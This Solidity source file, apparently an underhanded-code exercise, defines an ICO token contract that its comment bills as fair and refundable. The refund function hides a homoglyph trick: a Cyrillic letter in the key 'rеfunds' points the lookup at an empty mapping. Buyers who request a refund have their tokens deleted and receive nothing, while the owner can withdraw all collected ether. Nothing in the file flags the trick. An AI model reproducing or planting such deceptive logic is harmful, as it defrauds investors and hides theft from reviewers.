pragma solidity ^0.4.11;

contract SafeMath {
    	
	function safeMul(uint a, uint b) internal returns (uint) {
		uint c = a * b;
        	assert(a == 0 || c / a == b);
        	return c;
	}

	function safeDiv(uint a, uint b) internal returns (uint) {
		assert(b > 0);
		uint c = a / b;
		assert(a == b * c + a % b);
		return c;
	}
		
	function safeSub(uint a, uint b) internal returns (uint) {
		assert(b <= a);
		return a - b;
	}

	function safeAdd(uint a, uint b) internal returns (uint) {
		uint c = a + b;
		assert(c >= a);
		return c;
	}
}

// @dev the first fair ICO with a refund function

contract UnderhandedICO is SafeMath {
    
    	address owner;
	mapping(string => mapping (address => uint)) balances;
    
	uint256 public totalSupply;
	uint256 public endTime;
    	uint constant price = 1;
    
   	event Transfer(address indexed _from, address indexed _recipient, uint256 _value);
	event Approval(address indexed _owner, address indexed _spender, uint256 _value);
	

    	modifier beforeEndTime {
        	require(now < endTime);
        	_;
    	}
    
    	modifier duringSpecialPeriod {
        	require (now < 30 days + endTime);
       		 _;
    	}
    
    	modifier afterSpecialPeriod {
        	require(now >  30 days + endTime);
        	_;
    	}
    
	function withdrawalAmount(uint _amount) afterSpecialPeriod {
		require(msg.sender == owner);
		
		if(!msg.sender.send(_amount)) revert();
	}
    
	function () payable {
		createTokens(msg.sender);
	}

	function createTokens(address recipient) beforeEndTime payable {
		require(msg.value != 0);

		uint tokens = safeDiv(safeMul(msg.value, price), 1 ether);
		totalSupply = safeAdd(totalSupply, tokens);

		balances['token'][recipient] = safeAdd(balances['token'][recipient], tokens);
		balances['refunds'][recipient] = msg.value;
	}

	function UnderhandedICO() {
		endTime = now + 30 days;
		owner 	= msg.sender;
	}


	function tokenBalanceOf(address _owner) constant returns (uint256 balance) {
		return balances['token'][_owner];
	}
	
	function refundBalanceOf(address _owner) constant returns (uint256 balance) {
		if (now < 30 days + endTime) {
			return balances['refunds'][_owner];
		} else {
			return 0;
		}
	}

	function transfer(address _to, uint256 _value) afterSpecialPeriod returns (bool success){
		balances['token'][msg.sender] = safeSub(balances['token'][msg.sender], _value);
		balances['token'][_to] = safeAdd(balances['token'][_to], _value);
		Transfer(msg.sender, _to, _value);
		return true;
	}

	mapping (address => mapping (address => uint256)) allowed;

	function transferFrom(address _from, address _to, uint256 _value) afterSpecialPeriod returns (bool success){
		var _allowance = allowed[_from][msg.sender];
	    	balances['token'][_to] = safeAdd(balances['token'][_to], _value);
		balances['token'][_from] = safeSub(balances['token'][_from], _value);
		allowed[_from][msg.sender] = safeSub(_allowance, _value);
		Transfer(_from, _to, _value);
		return true;
	}

	function approve(address _spender, uint256 _value) afterSpecialPeriod returns (bool success) {
		allowed[msg.sender][_spender] = _value;
		Approval(msg.sender, _spender, _value);
		return true;
	}

	function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
		return allowed[_owner][_spender];
	}
	
	function refundTokenHolder() duringSpecialPeriod {
		require(balances['token'][msg.sender] != 0);
	    	delete balances['token'][msg.sender];
	    
		uint weiAmount = balances['rеfunds'][msg.sender];
		if (msg.sender.send(weiAmount)) {
	        	delete balances['refunds'][msg.sender];
	    	}
	}
}

